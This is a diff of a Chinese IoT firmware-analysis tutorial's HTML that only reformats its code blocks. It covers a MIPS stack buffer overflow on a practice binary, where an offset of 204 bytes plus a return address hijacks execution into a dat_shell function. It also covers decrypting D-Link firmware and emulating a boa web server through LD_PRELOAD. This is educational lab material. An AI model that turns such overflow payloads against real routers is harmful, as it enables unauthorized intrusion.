 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/10.png" srcset="/img/loading.gif" lazyload alt="10"></p>
 <p>调用命令查看样本的所有函数，可以看到各个函数的地址。</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">info</span> <span class="hljs-keyword">functions</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">info functions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
 <p>如果你感兴趣，可以使用命令查反汇编看下 main 函数的汇编码，这是 mips 架构的汇编码，跟 x86 的相差很大，完全看不懂。。</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">disass <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">disass main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/12.png" srcset="/img/loading.gif" lazyload alt="12"></p>
 <p>然后我们使用命令创建一个随机的 300 字节流，作为攻击字符串，用于测试参数溢出的点。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">pattern</span> <span class="hljs-keyword">create</span> <span class="hljs-number">300</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">pattern create 300<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
 <p>重新带参数调试 stack_bof_01。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo chroot . .&#x2F;qemu-mipsel-static -g 1234 .&#x2F;pwnable&#x2F;Intro&#x2F;stack_bof_01 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
 <p>gdb 挂上去后，输入 c 回车让程序跑起来，会发现程序崩溃了，SIGSEGV 内存出错，指针 ra 指向 0x63616162，对应的 ASCII 是”baac”。</p>
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/15.png" srcset="/img/loading.gif" lazyload alt="15"></p>
 <p>使用命令查看该溢出点在攻击字符串的什么位置，是位于 pattern 的第 204 位。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">pattern</span> <span class="hljs-keyword">search</span> <span class="hljs-number">0x63616162</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">pattern search 0x63616162<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/15.png" srcset="/img/loading.gif" lazyload alt="15"><br>然后反汇编 dat_shell 函数，查看其函数地址，我们的目的是要让程序本来执行 0x63616162，变成执行 dat_shell 的地址，理论上应该把 0x63616162 改成 0x400950，但书上说要略过前 3 条 gp 相关的指令，我也不知道为啥，有兴趣的同学 google 下吧。</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">disass dat_shell</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">disass dat_shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
 <p>将待执行的函数地址拼凑到 204 个字节后面，便可劫持程序执行流到 dat_shell 函数（0x40095C）,从而实现缓冲区溢出攻击。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 <span class="hljs-string">&quot;<span class="hljs-subst">$(python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*204 + &#x27;\x5c\x09\x40&#x27;&quot;</span>)</span>&quot;</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo chroot . .&#x2F;qemu-mipsel-static .&#x2F;pwnable&#x2F;Intro&#x2F;stack_bof_01 &quot;$(python -c &quot;print &#39;A&#39;*204 + &#39;\x5c\x09\x40&#39;&quot;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/17.png" srcset="/img/loading.gif" lazyload alt="17"></p>
 <p>最后，试了下 0x400950 确实不行，会报错。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 <span class="hljs-string">&quot;<span class="hljs-subst">$(python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*204 + &#x27;\x50\x09\x40&#x27;&quot;</span>)</span>&quot;</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo chroot . .&#x2F;qemu-mipsel-static .&#x2F;pwnable&#x2F;Intro&#x2F;stack_bof_01 &quot;$(python -c &quot;print &#39;A&#39;*204 + &#39;\x50\x09\x40&#39;&quot;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/03-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/18.png" srcset="/img/loading.gif" lazyload alt="18"></p>
 <h1 id="04-解密-dlink-固件"><a href="#04-解密-dlink-固件" class="headerlink" title="04 解密 dlink 固件"></a>04 解密 dlink 固件</h1><p>本次我们要研究的是路由器 Dlink-882 的固件，下载地址在：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ftp:<span class="hljs-regexp">//</span>ftp2.dlink.com<span class="hljs-regexp">/PRODUCTS/</span>DIR-<span class="hljs-number">882</span><span class="hljs-regexp">/REVA/</span>，其中的zip文件就是各版本的固件。<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ftp:&#x2F;&#x2F;ftp2.dlink.com&#x2F;PRODUCTS&#x2F;DIR-882&#x2F;REVA&#x2F;，其中的zip文件就是各版本的固件。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/04-%E8%A7%A3%E5%AF%86dlink%E5%9B%BA%E4%BB%B6/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>解压出来的固件版本从旧到新依次为：</p>
-<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">FW100B07</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">FW101B02</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">FW104B02</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">FW110B02</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">FW111B01</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">FW120B06</span> <span class="hljs-literal">--</span>&gt; <span class="hljs-comment">FW130B10</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">FW100B07 --&gt; FW101B02 --&gt; FW104B02 --&gt; FW110B02 --&gt; FW111B01 --&gt; FW120B06 --&gt; FW130B10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p>其中下图标记的两个固件是打包在同一个 zip 固件包中的，这里大家应该可以察觉到，FW104B02 有点特别，而且通过名字我们也猜测到它是未加密的中间版本。</p>
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/04-%E8%A7%A3%E5%AF%86dlink%E5%9B%BA%E4%BB%B6/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
@@ -501,7 +517,7 @@
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/04-%E8%A7%A3%E5%AF%86dlink%E5%9B%BA%E4%BB%B6/14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
 <h1 id="05-修复固件运行环境"><a href="#05-修复固件运行环境" class="headerlink" title="05-修复固件运行环境"></a>05-修复固件运行环境</h1><p>之前我们学习了如何模拟运行 IoT 固件，但是，现实中并不是所有固件都能模拟运行成功，比如固件运行可能依赖于硬件，qemu 无法完全模拟，所以，本节我们就来学习如何修复固件的运行环境，从而成功模拟固件运行。</p>
 <p>我们本次使用的固件是 D-Link 的 DIR-605L FW_113 固件，下载地址：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ftp:<span class="hljs-regexp">//</span>ftp2.dlink.com<span class="hljs-regexp">/PRODUCTS/</span>DIR-<span class="hljs-number">605</span>L<span class="hljs-regexp">/REVA/</span><br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ftp:&#x2F;&#x2F;ftp2.dlink.com&#x2F;PRODUCTS&#x2F;DIR-605L&#x2F;REVA&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/05-%E4%BF%AE%E5%A4%8D%E5%9B%BA%E4%BB%B6%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/pic/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>拿到固件后，我们惯用的使用 fat 工具进行模拟，会发现它报错了，Interfaces 那里也为空，说明模拟运行失败了。</p>
@@ -513,7 +529,7 @@
 <p>我们可以使用 find .&#x2F; -name boa 命令来定位该固件的 Web 程序。Boa 程序是一个轻量级的 web 服务器程序，常见于嵌入式系统中。dlink 就是在 boa 开源代码的基础上新增了很多功能接口以实现路由器上的不同功能。boa 程序的路径为&#x2F;bin&#x2F;boa，同时我们发现在&#x2F;etc&#x2F;boa 路径下还有个 boa 的密码配置文件，我们可以直接获取到 boa 加密后的密码。</p>
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/05-%E4%BF%AE%E5%A4%8D%E5%9B%BA%E4%BB%B6%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/pic/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>我们直接使用命令模拟运行程序，会发现报错了，提示初始化 MIB 错误。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./qemu-mips-static bin/boa<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo chroot . .&#x2F;qemu-mips-static bin&#x2F;boa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/05-%E4%BF%AE%E5%A4%8D%E5%9B%BA%E4%BB%B6%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/pic/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
 <p>使用 IDA 对 boa 程序进行逆向分析（需要先添加 mip 插件：<a target="_blank" rel="noopener" href="https://github.com/devttys0/ida%EF%BC%89%EF%BC%8C%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E2%80%9CInitialize">https://github.com/devttys0/ida），定位到字符串“Initialize</a> AP MIB failed”，接下来就在这里下断点，调试看下什么情况下会报这个错。</p>
@@ -541,10 +557,10 @@
 <p>由于代码复杂，我们就不细致分析了，直接参考作者的代码编写劫持代码，目的是伪造 apmib_init 和 apmib_get 函数，让其返回正确的值，由于为了方便 IDA 调试，作者把 fork 也一并劫持了（IDA 遇到 fork 异常）。</p>
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/05-%E4%BF%AE%E5%A4%8D%E5%9B%BA%E4%BB%B6%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/pic/18.png" srcset="/img/loading.gif" lazyload alt="18"></p>
 <p>编写好 apmib.c 后，使用 mips-linux-gnu-gcc 命令将该代码编译成 so，在这之前得先下载 mips 的 gcc。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install gcc-mips-linux-gnu<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo apt install gcc-mips-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p>然后使用命令进行编译。</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">mips-linux-gnu-gcc -Wall fPIC -<span class="hljs-keyword">shared</span> apmib.c -o apmib-ld.so<br></code></pre></td></tr></table></figure>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">mips-linux-gnu-gcc -Wall fPIC -shared apmib.c -o apmib-ld.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
 
 <p><img src="/2022/12/20/IOT%E5%AE%89%E5%85%A8/IOT%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/05-%E4%BF%AE%E5%A4%8D%E5%9B%BA%E4%BB%B6%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/pic/19.png" srcset="/img/loading.gif" lazyload alt="19"></p>
 <p>使用 LD_PRELOAD 参数指定劫持 so，这样当 boa 执行到 apmib_init 和 apmib_get 时，就会调用到 apmib-ld.so 里面的函数，从而顺利运行，运行成功的效果如下。</p>
